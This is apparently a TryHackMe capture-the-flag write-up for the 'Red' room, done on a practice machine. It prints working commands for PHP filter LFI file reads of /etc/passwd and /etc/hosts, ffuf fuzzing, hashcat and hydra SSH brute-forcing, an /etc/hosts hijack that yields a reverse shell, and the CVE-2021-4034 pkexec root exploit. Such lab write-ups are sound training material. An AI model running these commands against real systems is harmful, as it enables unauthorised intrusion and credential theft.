
# TryHackMe Write-Up: Red

**Date:** 2025-05-10   
**Profile:** cyphie  
**Room URL:** [Link to Room](https://tryhackme.com/room/redisl33t)  
**Difficulty:** Easy  
**Machine:** Kali Linux  
**tags:** Red vs Blue, CTF, King of the Hill, Red, Blue

---

## 🧠 Framework - Mitre ATT&CK

- ✅ Reconnaissance  
  Used Nmap, Nikto, and manual enumeration of the web app.

- ✅ Initial Access  
  Gained credentials via LFI + base64 decode → brute-forced into SSH as `blue`.

- ✅ Execution  
  Used `wget`, `ffuf`, and triggered code via LFI + local shell execution.

- ✅ Persistence  
  Briefly regained access after red team interference; not long-term persistence. Although this was not constant control I was able to get back in quite easily by generating a new password. 

- ✅ Lateral Movement  
  Transitioned from `blue` to `red` via `/etc/hosts` abuse and reverse shell.

- ✅ Privilege Escalation  
  Exploited SUID `pkexec` with CVE-2021-4034 to root.

- ✅ Action on Objectives  
  Read `root` flag and documented final compromise.

## Reasons for choosing framework
- We are attacking the red teams control of the web server. Using a framework such as this will give me structure as I enumerate the server. 
---

## 🛰️ Reconnaissance
### Enumeration

#### Nmap Scan

First up, nmap with the service -sV and script -sC flags. I decided to just go straight in and scan all the ports with the -p- flag so I did not miss anaything. 

`nmap -sV -sC -p- [Target IP]`

### What we learned
#### A few things pop out after the scan 
- Theres a http service running on port 80.
- SSH on port 22.
- There is a redirect to a page `/index.php?page=home.html
` which looks like it may give be vulnerable to file inclusion.
- There is a template running on the server using bootstrap.  

![Screenshot 2025-05-10 at 1 54 44 pm](https://github.com/user-attachments/assets/498149cb-1779-4deb-bb11-4bd57e028410)

### Nikto Scan

Next a Nikto scan was performed and did not reveal much more than the nmap scan. However there was a readme file which may be interesting. This may be something we can read through the file inclusion vulnerability. 

![Screenshot 2025-05-10 at 2 12 42 pm](https://github.com/user-attachments/assets/8193c4b6-a16d-4fca-be6e-11d4cb3b0069)

### Manual Enumeration of Web Page

The first thing we want to try is if we can read the readme.txt found by Nikto and we can. I wouldn't say this is amazing but it does confirm we are looking at a web page template made with a bootstrap library. This is good info and may be useful later. Moving on to enumerating for file inclusion with the redirect we are given. 

![Screenshot 2025-05-10 at 2 15 54 pm](https://github.com/user-attachments/assets/6a90f70e-5f93-4937-b1e3-ca157dc0c0ff)

#### Checking for Remote File Inclusion (RFI) and Local File Inclusion (RFI)

#### RFI
Changing the URL to try remotely add a page on the server was not happening using this URL edit `http://10.10.250.114/index.php?page=http://10.10.213.230/shell.txt` so we will move on to LFI.

#### LFI
Ok so since we struck out with RFI lets give this a go. We know our page is written in php but we can not read it and it may contain some more information. After running the command `http://10.10.250.114/index.php?page=php://filter/convert.base64-encode/resource=index.php` we get a base64 encoded string. We can easily decode this with Cyber Chef. 

![Screenshot 2025-05-10 at 2 47 07 pm](https://github.com/user-attachments/assets/cca43f05-0133-4b11-824e-57785c7ba019)

Of course the URL is malicious I'm a hacker!!!! Ignore this, moving on...

![Screenshot 2025-05-10 at 2 49 15 pm](https://github.com/user-attachments/assets/d70753c2-4b38-430b-b3ce-4c3fe24a3fd3)

Cyber Chef does it again. An easy decode from Base64 and we see our php script. The conditional statement in this code is checking if the page action which is being used in our url if you remember `/index.php?page=<things go here to ake a get request>`. The page element is being used to make a get request and is only checking if the command starts with a letter from a-z, otherwise it will send you right back to where you started. The first function is meant to throw us so we can't traverse the file system by sanitizing the user input to replace `../` and `./` with `""`. This would be pretty annoying if we had of kept trying this. 

![Screenshot 2025-05-10 at 2 51 13 pm](https://github.com/user-attachments/assets/13e4c40e-6945-4c3b-bcdf-f74f2fff1da0)

Now its known we can read files using the base64 encoding and the local file inclusion vulnerability. Let's try some common ones. by changing the directory and file at the end of the URL. 

- ✅ `/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd`
- ❌ `/index.php?page=php://filter/convert.base64-encode/resource=/etc/shadow`
- ✅ `/index.php?page=php://filter/convert.base64-encode/resource=/etc/hosts`

Getting somewhere now. We can see two obvious users besides root `red` and `blue`. Since we are blue we can try that one first. 

Let's see what we can see any hidden files inside of the blue home directory using `FFUF`. The full command is `ffuf -w /usr/share/wordlists/seclists/Miscellaneous/EFF-Dice/large_words.txt -u 'http://10.10.250.114/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.FUZZ' -mc 200 -fs 0
`. This command will use two flags `-mc` which filters for status code 200 and `-fs` which filters out any files with the size of 0. If you don't do this you will be hit with thousands of nothing packets to sort through. There is a small base64 string returned in the `.reminder` which we can decode file and an even bigger one with `.profile`. I had a look at the `.profile` and it seems to be a setup script. Basically, it sets up your environment by sourcing .bashrc and adding personal script folders to your path when you log in. 

![Screenshot 2025-05-10 at 3 50 04 pm](https://github.com/user-attachments/assets/a6a3de98-ae42-4c53-8c1f-1e92f5ffdcdd)

## Initial Access

When we decode the base64 string we get a password. The password on its own does not work to get into a shell using SSH but we can use it to make variations with hashcat then use hydra to bruteforce the password. 

![Screenshot 2025-05-10 at 4 00 54 pm](https://github.com/user-attachments/assets/1e166216-78ab-4b01-bb27-d1675f19715d)

Let's start by making those variations. First things first make a file and add the secret password into it. Call it whatever you want. This could technically be classed as weaponization but its more of an intiial access. 

`echo 'sup3r_p@s$w0rd!' > base.txt`

then we make the variations...

`hashcat -a 0 -r /usr/share/hashcat/rules/rockyou-30000.rule -o variations.txt base.txt --stdout`

Hashcat uses one of its rules to make variations. I chose to use the rockyou3000 one. 

Now that is done. The final thing to do it bruteforce the account using hydra. 

`hydra -l blue -P variations.txt ssh://10.10.250.114`

We get output and a valid password. 

![Screenshot 2025-05-10 at 4 15 36 pm](https://github.com/user-attachments/assets/5ca9975f-f28e-49dc-a360-29b87ae985fa)

After getting the password try it out in a fresh terminal shell `ssh blue@[Target IP]` and the password. Almost immedietley the taunts start coming in. We won't let that stop us. 

![Screenshot 2025-05-10 at 4 27 49 pm](https://github.com/user-attachments/assets/ed204888-f948-4e3f-9fa7-f88dd48b6936)

The first flag is in and access is gained. Let's take a look around. 

![Screenshot 2025-05-10 at 4 29 01 pm](https://github.com/user-attachments/assets/fce618fa-b59a-4946-8398-2cad290170bd)

It looks like the red team have kicked me off the shell I just got and the password is no longer working. We can generate another one though and log back in. We'll need to work faster. 

The red team taunt us with things such as `I bet you are going to use linpeas and pspy, noob` and pretending to give us a password that calls us a loser. They must have thought of this and luckily we don't need it. The blue team account is not a sudoer so that's out of the question. We'll need to move laterally another way.

Running `ls -la /etc/hosts` there is write permissions for the user on it and when we look inside that file we can see it has some hosts that do not exist on this system. The one that stands out is the IP that is attached to redrules.thm. 

![Screenshot 2025-05-10 at 4 38 31 pm](https://github.com/user-attachments/assets/6bcf2265-d813-452f-9329-235d0218262e)


There is a process running using that URL which we can use to get a reverse shell on the red team account. `ps aux | grep redrules`  

![Screenshot 2025-05-10 at 4 56 46 pm](https://github.com/user-attachments/assets/f991d513-2a9e-4ecb-a007-4dcd3da1e461)

This part needs to be done quick as the red team are removing the records when logging you out and even when you are active. 

![Screenshot 2025-05-10 at 4 59 11 pm](https://github.com/user-attachments/assets/cf24a466-fca9-445a-835a-244a75b57368)

![Screenshot 2025-05-10 at 4 51 36 pm](https://github.com/user-attachments/assets/af22949c-7233-4d5e-ae71-8125a24c1bbb)

## Weaponization and Exploitation

Now that we have access to the red account and are no longer getting booted out. We can take a look around. Since we had some luck with a hidden file inthe blue folder, maybe theres a hidden file or folder in the red team home folder. To check this run `ls -la` and there are a few. Taking a look around the one with the most interesting is the `.git` directory which contains an ELF executable. 

![Screenshot 2025-05-10 at 5 20 30 pm](https://github.com/user-attachments/assets/2c864625-7229-4d24-81c5-a62f25914623)

This version of `pkexec` is vulnerable to buffer overflow attack which can lead to a root shell through the policy kit library and has an attached CVE `CVE-2021-4034`. There is a PoC already made which we can use to exploit this vulnerability found here [https://github.com/mebeim/CVE-2021-4034](https://raw.githubusercontent.com/joeammond/CVE-2021-4034/refs/heads/main/CVE-2021-4034.py). As the `psexec` executable lives in a user folder and has its SUID bit set for the red user, the script needs a small adjustment to the path the executable is found. 

## Delivery and Installation

Once that's complete then find a way to get the file to the target machine from the attack box. I use the `python3 -m http.server` in the working directory on the attackbox then use `wget` on the target to move the file across. 

## Action on objectives
Once you've done that, run `chmod +x exploit.py` then `./exploit.py` and you should now be the root user. Get the flag from the home folder and job done. 
